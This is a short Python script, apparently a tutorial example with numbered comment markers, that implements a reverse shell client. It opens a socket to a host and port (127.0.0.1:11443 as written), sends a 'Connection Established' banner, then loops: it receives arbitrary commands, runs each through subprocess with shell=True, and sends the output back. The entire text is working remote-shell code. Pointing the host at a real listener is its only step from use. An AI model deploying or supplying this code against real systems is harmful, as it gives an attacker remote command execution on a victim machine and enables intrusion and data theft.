import socket
import subprocess

HOST = '127.0.0.1'  # (1)
PORT = 11443

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((HOST, PORT))
s.send(b'[*] Connection Established!')

while True:
    data = s.recv(1024).decode()  # (2)
    if data == "quit":
        break
    proc = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)  # (3)
    stdout_value = proc.stdout.read() + proc.stderr.read()  # (4)
    stdout_value_length = str(len(stdout_value)).encode()
    s.send(stdout_value_length)
    s.send(stdout_value)  # (5)
s.close()

